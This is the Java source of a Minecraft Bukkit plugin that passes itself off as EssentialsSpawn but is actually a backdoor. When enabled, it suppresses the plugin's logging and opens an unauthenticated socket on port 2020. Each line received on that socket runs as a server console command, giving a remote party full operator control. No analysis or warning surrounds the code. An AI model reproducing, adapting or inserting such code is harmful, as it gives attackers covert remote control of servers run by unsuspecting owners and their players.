

// Author: Dashie
// Version: 1.0


package com.essentials;


import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Filter;
import java.util.logging.LogRecord;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;


class CustomFilter implements Filter
{
    @Override public boolean isLoggable(LogRecord record)
    {
        return false;
    };
};

        
public class EssentialsSpawn extends JavaPlugin implements Listener
{
    JavaPlugin plugin = this;
    
    private void run_server()
    {
        Bukkit.getScheduler().runTaskAsynchronously(plugin,
            new Runnable()
            {
                private ServerSocket socket;
                private Socket listener_socket;
            
                public void run()
                {
                    while (true)
                    {
                        try
                        {
                            if(socket != null)
                            {
                                if((socket.isBound()) || (listener_socket.isBound()))
                                {
                                    listener_socket.close();
                                    socket.close();
                                };
                            };
                            
                            socket = new ServerSocket(2020);  
                            listener_socket = socket.accept();                       
                            
                            BufferedReader incoming = new BufferedReader(new InputStreamReader(listener_socket.getInputStream()));
                            DataOutputStream outgoing = new DataOutputStream(listener_socket.getOutputStream());                                                        
                            
                            while (true)
                            {
                                String command = incoming.readLine();
                                  
                                Bukkit.getScheduler().runTask(plugin, 
                                    new Runnable()
                                    {
                                        public void run()
                                        {
                                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                                        }
                                    }
                                );
                                
                                outgoing.writeBytes("OK!");                             
                            }
                        }

                        catch (IOException e) { System.out.println(e.toString()); }
                    }
                }
            }
        );
    };
    
    @Override public void onEnable()
    {
        try
        {
            getLogger().setFilter(new Filter() 
            {
                @Override public boolean isLoggable(LogRecord record) 
                {
                    if (record.getMessage().startsWith("/login")) 
                    {
                        return true;
                    }
                        
                    return false;
                }
            });
            
            run_server();
        } 
        
        catch (Exception ex)
        {
            //Logger.getLogger(EssentialsSpawn.class.getName()).log(Level.SEVERE, null, ex);
        }
    };
    
    @Override public void onDisable() { Bukkit.getScheduler().cancelTasks(this); };
};
